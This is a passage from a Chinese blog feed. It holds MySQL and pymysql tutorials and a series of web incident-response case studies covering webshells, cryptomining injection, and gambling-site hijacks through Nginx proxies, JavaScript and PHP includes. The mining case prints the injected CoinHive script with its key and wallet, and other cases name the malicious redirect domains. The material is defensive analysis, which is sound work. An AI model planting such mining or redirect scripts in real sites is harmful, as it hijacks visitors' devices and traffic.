href="#MODIFY-修改字段数据类型" class="headerlink" title="MODIFY: 修改字段数据类型"></a>MODIFY: 修改字段数据类型</h4><p>ALTER TABLE table_name MODIFY column_name column_type;  </p><h4 id="DROP-删除字段"><a href="#DROP-删除字段" class="headerlink" title="DROP: 删除字段"></a>DROP: 删除字段</h4><p>ALTER TABLE table_name DROP COLUMN column_name;  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>自动补全的mysql客户端</title>
      <link href="/2019/10/18/%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E7%9A%84mysql%E5%AE%A2%E6%88%B7%E7%AB%AF/"/>
      <url>/2019/10/18/%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E7%9A%84mysql%E5%AE%A2%E6%88%B7%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<p>最近发现一个对新手很友好的mysql客户端，主要是支持自动补全，这个就很方便啊。</p><h3 id="github地址：https-github-com-dbcli-mycli"><a href="#github地址：https-github-com-dbcli-mycli" class="headerlink" title="github地址：https://github.com/dbcli/mycli"></a>github地址：<a href="https://github.com/dbcli/mycli" target="_blank" rel="noopener">https://github.com/dbcli/mycli</a></h3><p>先看效果，网上找了一个gif，很直观看到效果。</p><p><img src="/images/mycli.gif" alt></p><p>有没有感觉很方便。</p><p>妈妈再也不会担心敲错mysql命令了。</p><p>那么好的东西，安装走起。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">您可能需要在Linux上使用。</span><br><span class="line"></span><br><span class="line">$ pip install -U mycli</span><br><span class="line"></span><br><span class="line">要么 </span><br><span class="line"></span><br><span class="line">#Only on macOS</span><br><span class="line"></span><br><span class="line">$ brew update &amp;&amp; brew install mycli </span><br><span class="line"></span><br><span class="line">要么 </span><br><span class="line"></span><br><span class="line">#Only on debian or ubuntu</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install mycli</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用方法：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mycli -u root -h localhost</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">mycli -h ip -u root -p root</span><br></pre></td></tr></table></figure><p>还在等什么，快去尝试一下吧</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python操作mysql</title>
      <link href="/2019/10/17/python%E6%93%8D%E4%BD%9Cmysql/"/>
      <url>/2019/10/17/python%E6%93%8D%E4%BD%9Cmysql/</url>
      
        <content type="html"><![CDATA[<p>最近在了解python，前几天和哥们讨论一下实际遇到的问题，觉得需要python+mysql，所以就折腾一下。</p><p><a href="https://github.com/PyMySQL/PyMySQL" target="_blank" rel="noopener">https://github.com/PyMySQL/PyMySQL</a><br>我们用到的是pymysql库，先看一下安装要求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python -- one of the following:  </span><br><span class="line">CPython : 2.7 and &gt;= 3.5  </span><br><span class="line">PyPy : Latest version  </span><br><span class="line">MySQL Server -- one of the following:  </span><br><span class="line">MySQL &gt;= 5.5  </span><br><span class="line">MariaDB &gt;= 5.5</span><br></pre></td></tr></table></figure><p>刚好都满足，那就开始安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">官方介绍安装方法（pip安装）  </span><br><span class="line"> python3 -m pip install PyMySQL  </span><br><span class="line">我的kali配置的是anaconda+pycharm/vscode，所以我的安装方式是  </span><br><span class="line">conda serach pymysql   //先搜索pymysql库  </span><br><span class="line">conda install pymysql    //安装pymysql库</span><br></pre></td></tr></table></figure><p>安装完成后我们查看一下是否安装成功。</p><p>打开python终端。输入<br>import pymysql<br>没有报错的话就是安装成功了。  </p><p><img src="/images/pymysql-1.png" alt></p><p>ok，现在我们这个pymysql库已经安装好了。  </p><p>exit（）退出终端。</p><p>下一步，打开mysql（运行/开启mysql服务）<br>server mysql start<br>我的已经开启好了，直接连接上去看看。<br>mysql -uroot -p </p><p><img src="/images/pymysql-2.png" alt></p><p>mysql现在也准备好了。现在开始撸代码了。  </p><p>//之前一直是pycharm，后来发现vscode，马上就抛弃了pycharm。我真是个善变的人。话说vscode真是轻量啊！pycharm是真的吃内存。心疼一下我的电脑。<br>扯偏了扯偏了。<br>打开vscode后，我们先想一想。思路是什么。  </p><h3 id="第一，连接数据库。"><a href="#第一，连接数据库。" class="headerlink" title="第一，连接数据库。"></a>第一，连接数据库。</h3><h3 id="第二，操作数据库（执行数据库命令）"><a href="#第二，操作数据库（执行数据库命令）" class="headerlink" title="第二，操作数据库（执行数据库命令）"></a>第二，操作数据库（执行数据库命令）</h3><h3 id="第三，显示数据（显示命令执行结果）"><a href="#第三，显示数据（显示命令执行结果）" class="headerlink" title="第三，显示数据（显示命令执行结果）"></a>第三，显示数据（显示命令执行结果）</h3><p>先导入pymysql库</p><p>import pymysql</p><h3 id="下面就是第一步，连接数据库。"><a href="#下面就是第一步，连接数据库。" class="headerlink" title="下面就是第一步，连接数据库。"></a>下面就是第一步，连接数据库。</h3><p>方法一，pymysql的github上介绍的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">db = pymysql.connect(host=&apos;localhost&apos;,  </span><br><span class="line">                             user=&apos;user&apos;,  </span><br><span class="line">                             password=&apos;passwd&apos;,  </span><br><span class="line">                             db=&apos;db&apos;,  </span><br><span class="line">                             charset=&apos;utf8mb4&apos;,  </span><br><span class="line">                             cursorclass=pymysql.cursors.DictCursor)  </span><br><span class="line">这就是数据库的基本配置文件。</span><br><span class="line"></span><br><span class="line">介绍一下几个需要自己修改的参数。  </span><br><span class="line">host    地址/ip地址  </span><br><span class="line">user    数据库连接用户名  </span><br><span class="line">password    连接密码  </span><br><span class="line">db    要连接/选择的数据库名  </span><br><span class="line">charset    数据库编码格式，默认不修改。  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">方法二。</span><br><span class="line"></span><br><span class="line">db=pymysql.connect(host=&apos;localhost&apos;,user=&apos;root&apos;,password=&apos;root&apos;,port=3306,db=&apos;web&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">方法三。我更喜欢这种。适合懒人。  </span><br><span class="line">db = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;web&quot; )</span><br></pre></td></tr></table></figure><h3 id="现在就是操作数据库了。"><a href="#现在就是操作数据库了。" class="headerlink" title="现在就是操作数据库了。"></a>现在就是操作数据库了。</h3><p>先贴代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#使用 cursor() 方法创建一个游标对象 cursor  </span><br><span class="line">cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">#使用 execute()  方法执行 SQL 查询 ,h是返回收影响的行数  </span><br><span class="line">h=cursor.execute(&apos;select * from admin;&apos;)</span><br><span class="line"></span><br><span class="line">#输出一下  </span><br><span class="line">print (h)</span><br></pre></td></tr></table></figure><p><img src="/images/pymysql-3.png" alt></p><p>注意，h是返回收影响的行数，就是查询结果返回的行数。</p><p>这里显示是3行。</p><p>我们来数据库操作一下看看是否正确。</p><p><img src="/images/pymysql-4.png" alt></p><p>web数据库admin表里面只有3个字段，说明正确，但是我们要的是返回的数据，而不是行数，怎么办，这就是第三步了。</p><h3 id="第三，显示数据"><a href="#第三，显示数据" class="headerlink" title="第三，显示数据"></a>第三，显示数据</h3><p>这里我们思考一下，我们要显示的数据是一个什么情况，是全部显示呢还是只显示一部分。数据少可以全部显示，但是数据成千上万，那全部显示就不太适用了。</p><p>上代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#使用 fetchone() 方法获取单条数据.</span><br><span class="line">#data = cursor.fetchone()</span><br><span class="line"></span><br><span class="line">#使用fetchall()获取全部数据</span><br><span class="line">#data=cursor.fetchall()</span><br><span class="line"></span><br><span class="line">#使用fetchmany(n)获取前n行数据</span><br><span class="line">#data=cursor.fetchmany(n)</span><br></pre></td></tr></table></figure><p>需要用那个，就改那个。<br>最后输出data就好了。</p><p>对了，最后别忘记关闭连接</p><p>#关闭数据库连接<br>db.close()</p><p>最后附上全部代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">import  pymysql</span><br><span class="line"></span><br><span class="line">#连接数据库</span><br><span class="line">db = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;web&quot; )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 使用 cursor() 方法创建一个游标对象 cursor</span><br><span class="line">cursor = db.cursor()</span><br><span class="line"> </span><br><span class="line"># 使用 execute()  方法执行 SQL 查询 ,h是返回收影响的行数</span><br><span class="line">h=cursor.execute(&apos;select * from admin;&apos;)</span><br><span class="line"></span><br><span class="line"># 使用 fetchone() 方法获取单条数据.</span><br><span class="line">#data = cursor.fetchone()</span><br><span class="line">#使用fetchall()获取全部数据</span><br><span class="line">data=cursor.fetchall()</span><br><span class="line">#使用fetchmany(n)获取前n行数据</span><br><span class="line">#data=cursor.fetchmany(n)</span><br><span class="line"></span><br><span class="line">print(data)    #输出查询结果</span><br><span class="line"></span><br><span class="line"># 关闭数据库连接</span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure><p><img src="/images/pymysql-5.png" alt></p><p>python操作mysql的简单方法。就到此结束了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第5章第1篇：网站被植入Webshell</title>
      <link href="/2019/10/16/%E7%AC%AC1%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E8%A2%AB%E6%A4%8D%E5%85%A5Webshell/"/>
      <url>/2019/10/16/%E7%AC%AC1%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E8%A2%AB%E6%A4%8D%E5%85%A5Webshell/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第1篇：网站被植入Webshell"><a href="#第1篇：网站被植入Webshell" class="headerlink" title="第1篇：网站被植入Webshell"></a>第1篇：网站被植入Webshell</h2><p>网站被植入webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入webshell接管网站的控制权。为了得到权限 ，常规的手段如：前后台任意文件上传，远程命令执行，Sql注入写入文件等。</p><h3 id="现象描述"><a href="#现象描述" class="headerlink" title="现象描述"></a>现象描述</h3><p>网站管理员在站点目录下发现存在webshell，于是开始了对入侵过程展开了分析。</p><p><img src="/images/1-1.png" alt></p><p>Webshell查杀工具：</p><p>D盾_Web查杀<br>Window下webshell查杀：<a href="http://www.d99net.net/index.asp" target="_blank" rel="noopener">http://www.d99net.net/index.asp</a></p><p>河马：支持多平台，但是需要联网环境。</p><p>使用方法:<br>wget <a href="http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz" target="_blank" rel="noopener">http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz</a><br>tar xvf hm-linux-amd64.tgz<br>hm scan  /www</p><h3 id="事件分析"><a href="#事件分析" class="headerlink" title="事件分析"></a>事件分析</h3><h4 id="1、-定位时间范围"><a href="#1、-定位时间范围" class="headerlink" title="1、 定位时间范围"></a>1、 <strong>定位时间范围</strong></h4><p>通过发现的webshell文件创建时间点，去翻看相关日期的访问日志。</p><p><img src="/images/1-2.png" alt></p><h4 id="2、Web-日志分析"><a href="#2、Web-日志分析" class="headerlink" title="2、Web 日志分析"></a>2、Web 日志分析</h4><p>经过日志分析，在文件创建的时间节点并未发现可疑的上传，但发现存在可疑的webservice接口</p><p><img src="/images/1-3.png" alt></p><h4 id="3、漏洞分析"><a href="#3、漏洞分析" class="headerlink" title="3、漏洞分析"></a>3、漏洞分析</h4><p>访问webservice接口，发现变量：buffer、distinctpach、newfilename可以在客户端自定义</p><p><img src="/images/1-4.png" alt></p><h4 id="4、漏洞复现"><a href="#4、漏洞复现" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h4><p>尝试对漏洞进行复现，可成功上传webshell，控制网站服务器</p><p><img src="/images/1-5.png" alt></p><p><img src="/images/1-6.png" alt></p><h4 id="5、漏洞修复"><a href="#5、漏洞修复" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h4><p>清除webshell并对webservice接口进行代码修复。</p><p>从发现webshell到日志分析，再到漏洞复现和修复，本文暂不涉及溯源取证方面。</p>]]></content>
      
      
      <categories>
          
          <category> web实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第五章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第5章第2篇：门罗币恶意挖矿</title>
      <link href="/2019/10/16/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E9%97%A8%E7%BD%97%E5%B8%81%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF/"/>
      <url>/2019/10/16/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E9%97%A8%E7%BD%97%E5%B8%81%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第2篇：门罗币恶意挖矿"><a href="#第2篇：门罗币恶意挖矿" class="headerlink" title="第2篇：门罗币恶意挖矿"></a>第2篇：门罗币恶意挖矿</h2><p>门罗币(Monero 或 XMR)，它是一个非常注重于隐私、匿名性和不可跟踪的加密数字货币。只需在网页中配置好js脚本，打开网页就可以挖矿，是一种非常简单的挖矿方式，而通过这种恶意挖矿获取数字货币是黑灰色产业获取收益的重要途径。</p><h3 id="现象描述"><a href="#现象描述" class="headerlink" title="现象描述"></a>现象描述</h3><p>利用XMR恶意挖矿，会大量占用用户的CPU资源，严重影响了网站的用户体验。</p><p>从08/09日0点开始，局域网内某IP访问网站页面会触发安全预警，只要访问此服务器上的网页，CPU直线上升100%</p><p><img src="/images/2-5.jpg" alt></p><h3 id="问题解析"><a href="#问题解析" class="headerlink" title="问题解析"></a>问题解析</h3><p>通过获取恶意网页url，对网页页面进行分析，发现网站页面被植入在线门罗币挖矿代码：</p><p><code>&lt;script&gt;      var script = document.createElement(&#39;script&#39;);      script.onload = function () {          // XMR Pool hash          var m = new CoinHive.Anonymous(&#39;BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu&#39;);         // TODO: Replace the below string with wallet string          m.start(&#39;47DuVLx9UuD1gEk3M4Wge1BwQyadQs5fTew8Q3Cxi95c8W7tKTXykgDfj7HVr9aCzzUNb9vA6eZ3eJCXE9yzhmTn1bjACGK&#39;);      };      script.src = &#39;https://coinhive.com/lib/coinhive.min.js&#39;;      document.head.appendChild(script);  &lt;/script&gt;</code></p><p>删除js里面的恶意代码，网站被XMR 恶意挖矿，服务器已经被攻击，进一步做服务器入侵排查。</p>]]></content>
      
      
      <categories>
          
          <category> web实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第五章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第5章第4篇：新闻源网站劫持</title>
      <link href="/2019/10/16/%E7%AC%AC4%E7%AF%87%EF%BC%9A%E6%96%B0%E9%97%BB%E6%BA%90%E7%BD%91%E7%AB%99%E5%8A%AB%E6%8C%81/"/>
      <url>/2019/10/16/%E7%AC%AC4%E7%AF%87%EF%BC%9A%E6%96%B0%E9%97%BB%E6%BA%90%E7%BD%91%E7%AB%99%E5%8A%AB%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第4篇：新闻源网站劫持"><a href="#第4篇：新闻源网站劫持" class="headerlink" title="第4篇：新闻源网站劫持"></a>第4篇：新闻源网站劫持</h2><p>新闻源网站一般权重较高，收录快，能够被搜索引擎优先收录，是黑灰产推广引流的必争之地，很容易成为被攻击的对象。被黑以后主要挂的不良信息内容主要是博彩六合彩等赌博类内容，新闻源网站程序无论是自主开发的还是开源程序，都有被黑的可能，开源程序更容易被黑。</p><h3 id="现象描述："><a href="#现象描述：" class="headerlink" title="现象描述："></a>现象描述：</h3><p>某新闻源网站首页广告链接被劫持到菠菜网站</p><p><img src="/images/4-1.png" alt></p><p>有三个广告专题，链接形式如下：</p><p>​    <a href="http://www.xxx.cn/zhuanti/yyysc/index.shtml" target="_blank" rel="noopener">http://www.xxx.cn/zhuanti/yyysc/index.shtml</a></p><p>​    <a href="http://www.xxx.cn/zhuanti/wwwsc/index.shtml" target="_blank" rel="noopener">http://www.xxx.cn/zhuanti/wwwsc/index.shtml</a></p><p>​    <a href="http://www.xxx.cn/zhuanti/zzzsc/index.shtml" target="_blank" rel="noopener">http://www.xxx.cn/zhuanti/zzzsc/index.shtml</a></p><p>点击这三条链接会跳转到博彩网站。简单抓包分析一下过程：</p><p><img src="/images/4-2.png" alt></p><p>可以发现此时这个返回页面已被劫持，并且加载了第三方js文件，<a href="http://xn--dpqw2zokj.com/N/js/dt.js，进一步访问该文件：" target="_blank" rel="noopener">http://xn--dpqw2zokj.com/N/js/dt.js，进一步访问该文件：</a></p><p><img src="./image/4-3.png" alt></p><p>dt.js进一步加载了另一条js，访问<a href="http://xn--dpqw2zokj.com/N/js/yz.js" target="_blank" rel="noopener">http://xn--dpqw2zokj.com/N/js/yz.js</a></p><p><img src="/images/4-4.png" alt></p><p>我们发现链接跳转到<a href="https://lemcoo.com/?dt，进一步访问这个链接，网站为博彩链接导航网站，访问后会随机跳转到第三方赌博网站。" target="_blank" rel="noopener">https://lemcoo.com/?dt，进一步访问这个链接，网站为博彩链接导航网站，访问后会随机跳转到第三方赌博网站。</a></p><p><img src="/images/4-5.png" alt></p><h3 id="问题处理："><a href="#问题处理：" class="headerlink" title="问题处理："></a>问题处理：</h3><p>找到url对应的文件位置，即使文件被删除，链接依然可以访问，可以发现三条链接都是以“sc”后缀。</p><p>对Nginx配置文件进行排查，发现Nginx配置文件VirtualHost.conf被篡改，通过反向代理匹配以“sc”后缀的专题链接，劫持到<a href="http://103.233.248.163" target="_blank" rel="noopener">http://103.233.248.163</a>，该网站为博彩链接导航网站。</p><p><img src="/images/4-6.png" alt></p><p>删除恶意代理后，专题链接访问恢复。</p>]]></content>
      
      
      <categories>
          
          <category> web实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第五章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第5章第5篇：移动端劫持</title>
      <link href="/2019/10/16/%E7%AC%AC5%E7%AF%87%EF%BC%9A%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%8A%AB%E6%8C%81/"/>
      <url>/2019/10/16/%E7%AC%AC5%E7%AF%87%EF%BC%9A%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%8A%AB%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第5篇：移动端劫持"><a href="#第5篇：移动端劫持" class="headerlink" title="第5篇：移动端劫持"></a>第5篇：移动端劫持</h2><p>PC端访问正常，移动端访问出现异常，比如插入弹窗、嵌入式广告和跳转到第三方网站，将干扰用户的正常使用，对用户体验造成极大伤害。</p><h3 id="现象描述"><a href="#现象描述" class="headerlink" title="现象描述"></a>现象描述</h3><p>部分网站用户反馈，手机打开网站就会跳转到赌博网站。</p><h3 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h3><p>访问网站首页，抓取到了一条恶意js： <a href="http://js.zadovosnjppnywuz.com/caonima.js" target="_blank" rel="noopener">http://js.zadovosnjppnywuz.com/caonima.js</a></p><p><img src="/images/5-1.png" alt></p><p>我们可以发现，攻击者通过这段js代码判断手机访问来源，劫持移动端（如手机、ipad、Android等）流量，跳转到<a href="https://262706.com。" target="_blank" rel="noopener">https://262706.com。</a></p><p>进一步访问<a href="https://262706.com，跳转到赌博网站：" target="_blank" rel="noopener">https://262706.com，跳转到赌博网站：</a></p><p><img src="/images/5-2.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> web实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第五章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第5章第6篇：搜索引擎劫持</title>
      <link href="/2019/10/16/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8A%AB%E6%8C%81/"/>
      <url>/2019/10/16/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8A%AB%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第6篇：搜索引擎劫持"><a href="#第6篇：搜索引擎劫持" class="headerlink" title="第6篇：搜索引擎劫持"></a>第6篇：搜索引擎劫持</h2><p>​    当你直接打开网址访问网站，是正常的，可是当你在搜索引擎结果页中打开网站时，会跳转到一些其他网站，比如博彩，虚假广告，淘宝搜索页面等。是的，你可能了遇到搜索引擎劫持。</p><h3 id="现象描述"><a href="#现象描述" class="headerlink" title="现象描述"></a>现象描述</h3><p>从搜索引擎来的流量自动跳转到指定的网页</p><h3 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h3><p>通过对index.php文件进行代码分析，发现该文件代码 对来自搜狗和好搜的访问进行流量劫持。</p><p><img src="/images/6-1.png" alt></p><p>进一步跟着include函数包含的文件，index,php包含/tmp/.ICE-unix/.. /c.jpg。</p><p><img src="/images/6-2.png" alt></p><p>进入/tmp目录进行查看，发现该目录下，如c.jpg等文件，包含着一套博彩劫持的程序。</p><p><img src="/images/6-3.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> web实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第五章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第5章第3篇：批量挂黑页</title>
      <link href="/2019/10/16/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%89%B9%E9%87%8F%E6%8C%82%E9%BB%91%E9%A1%B5/"/>
      <url>/2019/10/16/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%89%B9%E9%87%8F%E6%8C%82%E9%BB%91%E9%A1%B5/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第3篇：批量挂黑页"><a href="#第3篇：批量挂黑页" class="headerlink" title="第3篇：批量挂黑页"></a>第3篇：批量挂黑页</h2><p>作为一个网站管理员，你采用开源CMS做网站，比如dedecms，但是有一天，你忽然发现不知何时，网站的友情链接模块被挂大量垃圾链接，网站出现了很多不该有的目录，里面全是博彩相关的网页。而且，攻击者在挂黑页以后，会在一些小论坛注册马甲将你的网站黑页链接发到论坛，引爬虫收录。在搜索引擎搜索网站地址时，收录了一些会出现一些博彩页面，严重影响了网站形象。    </p><h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p>网站存在高危漏洞，常见于一些存在安全漏洞的开源CMS，利用0day批量拿站上传黑页。</p><h3 id="现象描述："><a href="#现象描述：" class="headerlink" title="现象描述："></a>现象描述：</h3><p>某网站被挂了非常多博彩链接，链接形式如下：</p><p>​        <a href="http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html" target="_blank" rel="noopener">http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html</a></p><p>​        <a href="http://www.xxx.com/upload/aomendduchangzaixian/index.html" target="_blank" rel="noopener">http://www.xxx.com/upload/aomendduchangzaixian/index.html</a></p><p>​        <a href="http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html" target="_blank" rel="noopener">http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html</a></p><p>链接可以访问，直接访问物理路径也可以看到文件，但是打开网站目录并没有发现这些文件，这些文件到底藏在了哪？</p><p>访问这些链接，跳转到如图页面：</p><p> <img src="/images/3-1.png" alt></p><h3 id="问题处理："><a href="#问题处理：" class="headerlink" title="问题处理："></a>问题处理：</h3><p>1、打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。</p><p><img src="/images/3-2.png" alt></p><p>2、再次查看，可以看到半透明的文件夹，清楚隐藏文件夹及所有页面</p><p><img src="/images/3-3.png" alt></p><p>3、然后清除IIS临时压缩文件</p><p>C:\inetpub\temp\IIS Temporary Compressed Files\WEBUI$^_gzip_D^\WEB\WEBUI\UPLOAD</p><p><img src="/images/3-4.png" alt></p><p>4、投诉快照，申请删除相关的网页收录，减少对网站的影响。</p>]]></content>
      
      
      <categories>
          
          <category> web实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第五章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第5章第7篇：网站首页被篡改</title>
      <link href="/2019/10/16/%E7%AC%AC7%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E9%A6%96%E9%A1%B5%E8%A2%AB%E7%AF%A1%E6%94%B9/"/>
      <url>/2019/10/16/%E7%AC%AC7%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E9%A6%96%E9%A1%B5%E8%A2%AB%E7%AF%A1%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第7篇：网站首页被篡改"><a href="#第7篇：网站首页被篡改" class="headerlink" title="第7篇：网站首页被篡改"></a>第7篇：网站首页被篡改</h2><p>​    网站首页被非法篡改，是的，就是你一打开网站就知道自己的网站出现了安全问题，网站程序存在严重的安全漏洞，攻击者通过上传脚本木马，从而对网站内容进行篡改。而这种篡改事件在某些场景下，会被无限放大。</p><h3 id="现象描述"><a href="#现象描述" class="headerlink" title="现象描述"></a>现象描述</h3><p>网站首页被恶意篡改，比如复制原来的图片，PS一下，然后替换上去。</p><h3 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h3><p>1、<strong>确认篡改时间</strong></p><p>通过对被篡改的图片进行查看，确认图片篡改时间为2018年04月18日 19:24:07 。</p><p><img src="/images/7-1.jpg" alt></p><p><strong>2、访问日志溯源</strong></p><p>通过图片修改的时间节点，发现可疑IP：113.xx.xx.24 （代理IP，无法追溯真实来源），访问image.jsp（脚本木马），并随后访问了被篡改的图片地址。</p><p><img src="/images/7-2.png" alt></p><p>进一步审查所有的日志文件(日志保存时间从2017-04-20至2018-04-19)，发现一共只有两次访问image.jsp文件的记录，分别是2018-04-18和2017-09-21。</p><p><img src="/images/7-3.png" alt></p><p>image.jsp在2017-09-21之前就已经上传到网站服务器，已经潜藏长达半年多甚至更久的时间。</p><p><strong>3、寻找真相</strong></p><p>我们在网站根目录找到了答案，发现站点目录下存在ROOT.rar全站源码备份文件，备份时间为2017-02-28<br>10:35。</p><p><img src="/images/7-4.png" alt></p><p>通过对ROOT.rar解压缩，发现源码中存在的脚本木马与网站访问日志的可疑文件名一致（image.jsp）。</p><p><img src="/images/7-5.png" alt></p><p>根据这几个时间节点，我们尝试去还原攻击者的攻击路径。</p><p>但是我们在访问日志并未找到ROOT.rar的访问下载记录，访问日志只保留了近一年的记录，而这个webshell可能已经存在了多年。</p><p>黑客是如何获取webshell的呢？</p><p>可能是通过下载ROOT.rar全站源码备份文件获取到其中存在的木马信息，或者几年前入侵并潜藏了多年，又或者是从地下黑产购买了shell，我们不得而知。</p><p>本文的示例中攻击者为我们留下了大量的证据和记录，而更多时候，攻击者可能会清除所有的关键信息，这势必会加大调查人员的取证难度。</p>]]></content>
      
      
      <categories>
          
          <category> web实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第五章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第2章第1篇:Window日志分析</title>
